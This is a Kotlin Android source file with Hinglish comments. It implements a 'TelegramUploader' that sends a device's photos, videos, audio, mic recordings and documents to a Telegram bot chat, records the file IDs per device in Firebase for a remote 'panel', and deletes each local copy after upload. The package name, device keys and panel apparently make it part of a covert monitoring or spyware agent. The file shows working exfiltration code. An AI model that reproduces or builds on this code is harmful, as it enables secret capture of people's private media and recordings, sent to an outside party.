package com.guard.agent.helpers.telegram

import android.content.Context
import android.util.Log
import com.google.firebase.database.FirebaseDatabase
import com.guard.agent.core.Constants
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * Telegram Bot se file upload karta hai.
 * Firebase Storage ki jagah — 100% free, unlimited.
 */
object TelegramUploader {

    private const val TAG = "TelegramUploader"

    private val client = OkHttpClient.Builder()
        .connectTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .build()

    /**
     * Photo upload — Telegram sendPhoto.
     * Note: Telegram photo compress karta hai.
     * Original quality chahiye toh uploadDocument use kar.
     */
    fun uploadPhoto(
        ctx: Context,
        deviceKey: String,
        file: File,
        folder: String,
        onResult: (Boolean) -> Unit = {}
    ) {
        uploadMedia(ctx, deviceKey, file, "sendPhoto", "photo", folder, onResult)
    }

    /**
     * Document upload — original quality, koi compression nahi.
     * Audio, video, APK, sab ke liye best.
     */
    fun uploadDocument(
        ctx: Context,
        deviceKey: String,
        file: File,
        folder: String,
        onResult: (Boolean) -> Unit = {}
    ) {
        uploadMedia(ctx, deviceKey, file, "sendDocument", "document", folder, onResult)
    }

    /**
     * Video upload.
     */
    fun uploadVideo(
        ctx: Context,
        deviceKey: String,
        file: File,
        folder: String,
        onResult: (Boolean) -> Unit = {}
    ) {
        uploadMedia(ctx, deviceKey, file, "sendVideo", "video", folder, onResult)
    }

    /**
     * Audio upload.
     */
    fun uploadAudio(
        ctx: Context,
        deviceKey: String,
        file: File,
        folder: String,
        onResult: (Boolean) -> Unit = {}
    ) {
        uploadMedia(ctx, deviceKey, file, "sendAudio", "audio", folder, onResult)
    }

    /**
     * Voice upload (mic recordings ke liye).
     */
    fun uploadVoice(
        ctx: Context,
        deviceKey: String,
        file: File,
        folder: String,
        onResult: (Boolean) -> Unit = {}
    ) {
        uploadMedia(ctx, deviceKey, file, "sendVoice", "voice", folder, onResult)
    }

    /**
     * Main upload function.
     */
    private fun uploadMedia(
        ctx: Context,
        deviceKey: String,
        file: File,
        endpoint: String,
        fieldName: String,
        folder: String,
        onResult: (Boolean) -> Unit
    ) {
        Thread {
            try {
                if (!file.exists() || file.length() == 0L) {
                    Log.e(TAG, "File missing or empty: ${file.absolutePath}")
                    onResult(false)
                    return@Thread
                }

                val token = Constants.TELEGRAM_BOT_TOKEN
                val chatId = Constants.TELEGRAM_CHAT_ID

                if (token.contains("YOUR_") || chatId.contains("YOUR_")) {
                    Log.e(TAG, "Telegram credentials not set in Constants.kt")
                    onResult(false)
                    return@Thread
                }

                // Multipart body banao
                val mimeType = guessMimeType(file.name)
                val fileBody = file.asRequestBody(mimeType.toMediaType())

                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart(fieldName, file.name, fileBody)
                    .build()

                val url = "${Constants.TELEGRAM_API_BASE}$token/$endpoint"
                val request = Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build()

                val response = client.newCall(request).execute()
                val body = response.body?.string() ?: ""

                if (!response.isSuccessful) {
                    Log.e(TAG, "Upload failed: ${response.code} — $body")
                    onResult(false)
                    return@Thread
                }

                // Response parse karo — file_id nikalo
                val json = JSONObject(body)
                if (!json.optBoolean("ok", false)) {
                    Log.e(TAG, "Telegram returned not ok: $body")
                    onResult(false)
                    return@Thread
                }

                val result = json.getJSONObject("result")
                val fileId = extractFileId(result, fieldName)

                if (fileId.isNullOrBlank()) {
                    Log.e(TAG, "No file_id in response: $body")
                    onResult(false)
                    return@Thread
                }

                Log.d(TAG, "Upload OK: $folder — file_id=$fileId")

                // Firebase DB mein save karo
                saveToFirebase(deviceKey, folder, fileId, file.name)

                // Local file delete
                file.delete()

                onResult(true)
            } catch (e: Exception) {
                Log.e(TAG, "Upload exception", e)
                onResult(false)
            }
        }.start()
    }

    /**
     * Response se file_id nikalo.
     */
    private fun extractFileId(result: JSONObject, fieldName: String): String? {
        // Different endpoints mein structure different hai
        // sendPhoto → result.photo (array of sizes) — last one biggest
        // sendDocument → result.document.file_id
        // sendVideo → result.video.file_id
        // sendAudio → result.audio.file_id
        // sendVoice → result.voice.file_id

        return when (fieldName) {
            "photo" -> {
                val photoArray = result.optJSONArray("photo") ?: return null
                if (photoArray.length() == 0) return null
                // Last = highest resolution
                photoArray.getJSONObject(photoArray.length() - 1).optString("file_id")
            }
            "document" -> result.optJSONObject("document")?.optString("file_id")
            "video" -> result.optJSONObject("video")?.optString("file_id")
            "audio" -> result.optJSONObject("audio")?.optString("file_id")
            "voice" -> result.optJSONObject("voice")?.optString("file_id")
            else -> null
        }
    }

    /**
     * Firebase DB mein file_id aur metadata save karo.
     */
    private fun saveToFirebase(
        deviceKey: String,
        folder: String,
        fileId: String,
        fileName: String
    ) {
        try {
            FirebaseDatabase.getInstance()
                .getReference(Constants.PATH_DEVICES)
                .child(deviceKey).child(folder).push()
                .setValue(
                    mapOf(
                        "fileId" to fileId,
                        "fileName" to fileName,
                        "time" to System.currentTimeMillis()
                    )
                )
        } catch (e: Exception) {
            Log.e(TAG, "Firebase save failed", e)
        }
    }

    /**
     * File extension se MIME type guess karo.
     */
    private fun guessMimeType(name: String): String {
        return when {
            name.endsWith(".jpg", true) || name.endsWith(".jpeg", true) -> "image/jpeg"
            name.endsWith(".png", true) -> "image/png"
            name.endsWith(".mp4", true) -> "video/mp4"
            name.endsWith(".m4a", true) -> "audio/mp4"
            name.endsWith(".mp3", true) -> "audio/mpeg"
            name.endsWith(".aac", true) -> "audio/aac"
            name.endsWith(".wav", true) -> "audio/wav"
            name.endsWith(".3gp", true) -> "video/3gpp"
            name.endsWith(".apk", true) -> "application/vnd.android.package-archive"
            else -> "application/octet-stream"
        }
    }

    /**
     * File ID se public URL banao (panel ke liye).
     * Ye URL panel mein directly use kar sakta hai.
     */
    fun getFileUrl(fileId: String): String {
        return "${Constants.TELEGRAM_API_BASE}${Constants.TELEGRAM_BOT_TOKEN}/getFile?file_id=$fileId"
    }
}
